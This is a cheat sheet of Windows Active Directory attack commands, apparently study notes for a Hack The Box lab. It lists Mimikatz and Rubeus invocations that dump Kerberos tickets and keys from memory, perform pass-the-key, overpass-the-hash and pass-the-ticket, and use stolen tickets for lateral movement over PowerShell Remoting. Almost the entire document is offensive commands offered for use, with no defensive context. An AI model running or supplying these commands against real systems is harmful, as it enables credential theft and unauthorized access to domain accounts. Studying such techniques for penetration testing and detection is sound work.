### Mimikatz - Export Tickets
```cmmimikatz.exe
privilege::debug
sekurlsa::tickets /export

# Once done
dir *.kirbi
```

### Rubeus - Export Tickets
```cmd
Rubeus.exe dump /nowrap
# Option
/nowrap: Make the output easier to be copied and pasted.
```

### Pass the Key/OverPass the Hash
- Mimikatz - Extract Kerberos Keys
```cmd
sekurlsa::ekeys
```
- Mimikatz - Pass the Key/OverPass the Hash
```cmd
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:$DOMAIN /user:$USERNAME /ntlm:$HASH
```
- Rubeus - Pass the Key or OverPass the Hash
```cmd
Rubeus.exe asktgt /domain:$DOMAIN /user:$USERNAME /ae256:$HASH /nowrap
```

### Pass the ticket
- Rubeus
```cmd
# Export ticket
Rubeus.exe asktgt /domain:$DOMAIN /user:$USERNAME /rc4:$HASH /ptt
# Pass the ticket
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
```
- Convert .kirbi to Base64 Format
```PowerShell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
- Pass the Ticket - Base64 Format
```bash
Rubeus.exe ptt /ticket:$STRING
```
- Mimikatz
```bash
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
```

---------
# Pass the ticket with PowerShell Remoting
---------------------
### Mimikattz - PowerShell Remoting with Pass the Ticket for Lateral Movement
```cmd
mimikatz.exe
privilege::debug
kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
```

### Rubeus - PowerShell Remoting with Pass the Ticket
- Create a sacrificial Process/logon session with Rubeus.
- This process is hidden by default. The flag /show is used to display the process
- This prevents aresure of existing TGTs for the current logon session
```cmd
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```
- Rubeus - Pass the Ticket for Lateral Movement
```cmd
Rubeus.exe asktgt /user:$USERNAME /domain:$DOMAIN /aes256:$HASH /ptt
```
